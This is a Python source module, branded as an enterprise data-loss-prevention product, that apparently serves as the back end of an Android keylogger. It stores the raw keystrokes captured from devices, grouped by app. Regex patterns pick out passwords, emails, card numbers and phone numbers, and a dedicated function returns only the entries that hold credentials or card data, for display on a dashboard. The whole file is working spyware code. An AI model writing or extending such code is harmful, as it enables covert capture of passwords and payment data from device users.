"""
ATHEX DLP Enterprise - Keylogger Module
========================================
Processes keylogger data from Android devices.
"""

import json
import logging
import re
from datetime import datetime
from typing import Dict, List, Any

logger = logging.getLogger(__name__)


class KeyloggerHandler:
    """Handles keylogger data processing"""
    
    # Sensitive patterns to highlight
    SENSITIVE_PATTERNS = {
        "password": [r'password[:\s]*(\S+)', r'pass[:\s]*(\S+)', r'pwd[:\s]*(\S+)'],
        "email": [r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}'],
        "credit_card": [r'\b\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{4}\b'],
        "phone": [r'\+?[\d\s\-\(\)]{10,15}'],
        "url": [r'https?://[^\s]+'],
    }
    
    def __init__(self):
        self.keylog_data: Dict[str, List[Dict]] = {}
        self.max_entries = 500
        logger.info("KeyloggerHandler initialized")
    
    def process(self, session_id: str, raw_data: Any) -> Dict:
        """
        Process keylogger data from device.
        
        Args:
            session_id: Device session ID
            raw_data: Keylog entry (dict with text, app, etc.)
            
        Returns:
            Processed keylog entry
        """
        try:
            if isinstance(raw_data, str):
                try:
                    data = json.loads(raw_data)
                except json.JSONDecodeError:
                    data = {"text": raw_data}
                except ValueError:
                    data = {"text": raw_data}
            else:
                data = raw_data
            
            if not isinstance(data, dict):
                data = {"text": str(data)}
            
            text = data.get("text", data.get("data", ""))
            app_name = data.get("app_name", data.get("app", "Unknown"))
            
            # Detect sensitive data
            detections = self._detect_sensitive(text)
            
            entry = {
                "session_id": session_id,
                "text": text,
                "text_masked": self._mask_sensitive(text) if detections else text,
                "app_name": app_name,
                "package": data.get("package", ""),
                "timestamp": datetime.now().isoformat(),
                "detections": detections,
                "has_sensitive": len(detections) > 0
            }
            
            # Store
            if session_id not in self.keylog_data:
                self.keylog_data[session_id] = []
            
            self.keylog_data[session_id].append(entry)
            
            if len(self.keylog_data[session_id]) > self.max_entries:
                self.keylog_data[session_id] = self.keylog_data[session_id][-self.max_entries:]
            
            if detections:
                logger.info(f"⌨️ Keylog: {len(detections)} sensitive patterns detected from {session_id}")
            
            return {
                "success": True,
                "entry": entry
            }
            
        except json.JSONDecodeError as e:
            logger.error(f"JSON decode error processing keylog: {e}")
            return {"success": False, "error": f"Invalid JSON: {e}"}
        except KeyError as e:
            logger.error(f"Missing key in keylog data: {e}")
            return {"success": False, "error": f"Missing data: {e}"}
        except Exception as e:
            logger.error(f"Unexpected error processing keylog: {e}")
            return {"success": False, "error": str(e)}
    
    def _detect_sensitive(self, text: str) -> List[Dict]:
        """Detect sensitive patterns in text"""
        detections = []
        
        for category, patterns in self.SENSITIVE_PATTERNS.items():
            for pattern in patterns:
                try:
                    matches = re.findall(pattern, text, re.IGNORECASE)
                    for match in matches:
                        if isinstance(match, tuple):
                            match = match[0] if match else ""
                        
                        if match and len(match) > 2:
                            detections.append({
                                "category": category,
                                "value": self._mask_value(match, category),
                                "pattern": pattern
                            })
                except re.error as e:
                    logger.error(f"Regex error in pattern '{pattern}': {e}")
        
        return detections
    
    def _mask_value(self, value: str, category: str) -> str:
        """Mask detected value"""
        if len(value) < 6:
            return "***"
        
        if category == "credit_card":
            return value[:4] + "-****-****-" + value[-4:]
        elif category == "email":
            parts = value.split("@")
            if len(parts) == 2:
                return parts[0][:2] + "***@" + parts[1]
            return "***@***"
        elif category == "password":
            return value[:2] + "****"
        
        return value[:3] + "***" + value[-3:]
    
    def _mask_sensitive(self, text: str) -> str:
        """Mask all sensitive data in text"""
        for category, patterns in self.SENSITIVE_PATTERNS.items():
            for pattern in patterns:
                try:
                    text = re.sub(pattern, "****", text, flags=re.IGNORECASE)
                except re.error:
                    pass
        return text
    
    def get_entries(self, session_id: str, limit: int = 50) -> list:
        """Get recent keylog entries"""
        entries = self.keylog_data.get(session_id, [])
        return entries[-limit:]
    
    def get_sensitive_only(self, session_id: str) -> list:
        """Get only entries with sensitive data"""
        entries = self.keylog_data.get(session_id, [])
        return [e for e in entries if e.get("has_sensitive")]
    
    def format_for_dashboard(self, entries: list) -> list:
        """Format for dashboard display"""
        return [
            {
                "time": e.get("timestamp", "")[-8:] if e.get("timestamp") else "",
                "app": e.get("app_name", "Unknown"),
                "text": e.get("text_masked", e.get("text", ""))[:100],
                "sensitive": "⚠️" if e.get("has_sensitive") else "",
                "detections": len(e.get("detections", []))
            }
            for e in entries
        ]


keylogger_handler = KeyloggerHandler()